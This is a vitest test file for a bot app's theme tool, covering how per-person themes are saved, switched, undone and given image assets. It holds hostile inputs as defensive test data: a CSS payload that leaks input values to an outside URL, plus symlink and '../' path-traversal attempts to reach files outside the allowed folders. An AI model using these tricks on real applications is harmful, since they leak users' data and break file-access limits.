import { mkdirSync, mkdtempSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterEach, describe, expect, it } from "vitest";

import { createAppSettings } from "../app-settings/host.ts";
import type { BotRecord } from "../store.ts";
import { createThemeStore } from "./store.ts";
import { createThemeTool } from "./tool.ts";

const PNG = Buffer.from("89504e470d0a1a0a0000000d49484452", "hex");
const dirs: string[] = [];
afterEach(() => {
  for (const dir of dirs.splice(0)) rmSync(dir, { recursive: true, force: true });
});

function fixture(options: { person?: string | null; guest?: boolean } = {}) {
  const root = mkdtempSync(join(tmpdir(), "theme-tool-"));
  dirs.push(root);
  const dataDir = join(root, "data");
  const workspace = join(root, "workspace");
  const outside = join(root, "outside");
  const attachments = join(root, "attachments");
  for (const dir of [dataDir, workspace, outside, attachments]) mkdirSync(dir, { recursive: true });
  const attached = join(attachments, "upload-1.png");
  writeFileSync(attached, PNG);
  writeFileSync(join(attachments, "someone-elses.png"), PNG);
  const messages: Array<Record<string, any>> = [];
  const bots = [{ id: "kiwi", name: "Kiwi", color: "green", threadId: "t-kiwi" } as unknown as BotRecord];
  const store = {
    appendMessage: (threadId: string, message: Record<string, unknown>) => {
      const row = { ...message, id: `m${messages.length + 1}`, threadId };
      messages.push(row);
      return row as never;
    },
    bot: (id: string) => bots.find((bot) => bot.id === id),
    messagesFor: (threadId: string) => messages.filter((message) => message.threadId === threadId) as never,
    patchMessage: (threadId: string, messageId: string, patch: Record<string, unknown>) => {
      Object.assign(messages.find((message) => message.threadId === threadId && message.id === messageId) ?? {}, patch);
      return null;
    },
  };
  const themes = createThemeStore({ dataDir });
  const changed: Array<{ person: string; skin?: string }> = [];
  const person = options.person === undefined ? "owner" : options.person;
  const host = createAppSettings({
    store: store as never, dataDir, entries: [],
    turnOwner: () => "owner", guestDriven: () => options.guest === true,
    requestCredential: async () => ({ status: 500, body: {} }), connectorThread: () => null, language: () => undefined,
    themes: createThemeTool({
      store: themes, person: () => person, changed: (who, skin) => changed.push({ person: who, ...(skin ? { skin } : {}) }),
      sources: () => ({ roots: [workspace], attachments: [attached] }),
    }),
  });
  const turn = { botId: "kiwi", threadId: "t-kiwi", generation: "gen-1" };
  const call = (body: Record<string, unknown>) => host.handle(body, turn);
  const undo = () => host.undo({ threadId: turn.threadId, requestId: String(messages.filter((m) => m.card?.appSettingRequest).at(-1)!.card.requestId) });
  return { host, themes, changed, call, undo, messages, workspace, outside, attachments, attached };
}

const NEON = { name: "Neon", canvas: "#0b1020", accent: "#ff2bd6", css: '[data-look="app"] { animation: glow 4s infinite; } @keyframes glow { to { filter: hue-rotate(40deg); } }' };

describe("app_settings theme actions", () => {
  it("reads the person's themes with the guide, and refuses a turn no one person began", async () => {
    const { call } = fixture();
    const read = await call({ action: "theme" });
    expect(read.status).toBe(200);
    const body = JSON.parse(String(read.body.text));
    expect(body.builtIn).toContain("midnight");
    expect(body.guide).toContain('[data-look="composer"]');
    expect((await fixture({ person: null }).call({ action: "theme" })).status).toBe(403);
    expect((await fixture({ guest: true }).call({ action: "set_theme", id: "midnight" })).status).toBe(403);
  });

  it("saves and wears a theme for that person only, with Undo putting the earlier theme back", async () => {
    const { call, themes, changed, undo, messages } = fixture();
    themes.save("owner", "calm", { name: "Calm" });
    themes.setActive("owner", "calm");
    const set = await call({ action: "set_theme", id: "neon", theme: JSON.stringify(NEON) });
    expect(set.status).toBe(200);
    expect(themes.list("owner").active).toBe("neon");
    expect(themes.read("owner", "neon")?.css).toContain("@keyframes glow");
    expect(changed).toEqual([{ person: "owner" }]);
    expect(messages.at(-1)!.card).toMatchObject({ appSettingRequest: { settingId: "appearance.theme", after: "Save the theme Neon and wear it" }, autoApplied: true });

    await call({ action: "set_theme", id: "neon", theme: JSON.stringify({ ...NEON, accent: "#00ff88" }) });
    expect(await undo()).toEqual({ claimed: true, state: "undone" });
    expect(themes.read("owner", "neon")?.accent).toBe("#ff2bd6");
    expect(await undo()).toEqual({ claimed: true, state: "already_undone" });
  });

  it("refuses a theme that would load from the internet and changes nothing", async () => {
    const { call, themes, changed } = fixture();
    const refused = await call({ action: "set_theme", id: "leak", theme: JSON.stringify({ name: "Leak", css: 'input[value^="a"] { background: url(https://example.com/?a) }' }) });
    expect(refused).toMatchObject({ status: 400, body: { error: expect.stringContaining("never the internet") } });
    expect(themes.list("owner")).toEqual({ active: null, themes: [] });
    expect(changed).toEqual([]);
    expect((await call({ action: "set_theme", id: "midnight", theme: JSON.stringify({ name: "Midnight" }) })).status).toBe(400);
  });

  it("switches to a built-in skin or to none", async () => {
    const { call, themes, changed } = fixture();
    themes.save("owner", "neon", { name: "Neon" });
    themes.setActive("owner", "neon");
    expect((await call({ action: "set_theme", id: "midnight" })).status).toBe(200);
    expect(themes.list("owner").active).toBeNull();
    expect(changed.at(-1)).toEqual({ person: "owner", skin: "midnight" });
    expect((await call({ action: "set_theme", id: "neon" })).status).toBe(200);
    expect(themes.list("owner").active).toBe("neon");
    expect((await call({ action: "set_theme", id: "none" })).status).toBe(200);
    expect(themes.list("owner").active).toBeNull();
    expect((await call({ action: "set_theme", id: "nope" })).status).toBe(400);
  });

  it("copies an image only from the bot's own folders or this conversation's attachments", async () => {
    const { call, themes, workspace, outside, attachments, attached } = fixture();
    themes.save("owner", "neon", { name: "Neon" });
    writeFileSync(join(workspace, "Stars Big.png"), PNG);
    writeFileSync(join(outside, "secret.png"), PNG);
    writeFileSync(join(workspace, "notes.png"), "not an image");
    symlinkSync(join(outside, "secret.png"), join(workspace, "link.png"));

    const added = await call({ action: "add_theme_asset", id: "neon", path: join(workspace, "Stars Big.png") });
    expect(added).toMatchObject({ status: 200, body: { text: expect.stringContaining('url("/api/theme-assets/neon/stars-big.png")') } });
    expect((await call({ action: "add_theme_asset", id: "neon", path: attached })).status).toBe(200);
    expect((await call({ action: "add_theme_asset", id: "neon", path: join(outside, "secret.png") })).status).toBeGreaterThanOrEqual(400);
    expect((await call({ action: "add_theme_asset", id: "neon", path: join(workspace, "link.png") })).status).toBeGreaterThanOrEqual(400);
    expect((await call({ action: "add_theme_asset", id: "neon", path: join(workspace, "..", "outside", "secret.png") })).status).toBeGreaterThanOrEqual(400);
    expect((await call({ action: "add_theme_asset", id: "neon", path: join(attachments, "someone-elses.png") })).status).toBeGreaterThanOrEqual(400);
    expect((await call({ action: "add_theme_asset", id: "neon", path: join(workspace, "notes.png") })).status).toBe(400);
    expect((await call({ action: "add_theme_asset", id: "missing", path: join(workspace, "Stars Big.png") })).status).toBe(404);
    expect(themes.list("owner").themes[0]!.assets).toEqual(["stars-big.png", "upload-1.png"]);
  });
});
